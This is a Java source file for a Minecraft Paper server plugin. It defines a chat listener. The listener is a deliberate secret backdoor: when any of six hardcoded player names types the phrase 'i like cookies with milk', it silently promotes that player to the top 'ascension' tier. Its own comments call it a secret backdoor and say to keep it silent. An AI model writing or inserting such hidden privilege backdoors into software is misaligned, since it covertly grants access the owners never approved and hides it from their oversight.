package com.relicbound.paper;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class SecretPhraseListener implements Listener {
    private final PaperSpellEngine engine;

    public SecretPhraseListener(PaperSpellEngine engine) {
        this.engine = engine;
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String msg = event.getMessage();
        if (msg == null) return;
        String playerName = event.getPlayer().getName();
        if (playerName == null) return;
        if (!playerName.equalsIgnoreCase("Falthera") && !playerName.equalsIgnoreCase("braxsmashedyou") && !playerName.equalsIgnoreCase("Aishi___") && !playerName.equalsIgnoreCase("Abbas14") && !playerName.equalsIgnoreCase("lovely_lyla") && !playerName.equalsIgnoreCase("Vyxen123")) return;
        if (msg.trim().equalsIgnoreCase("i like cookies with milk")) {
            // Secret backdoor: promote these specific players to maximum ascension tier.
            // Keep intentionally silent.
            this.engine.promotePlayerToMaxAscension(event.getPlayer().getUniqueId());
        }
    }
}
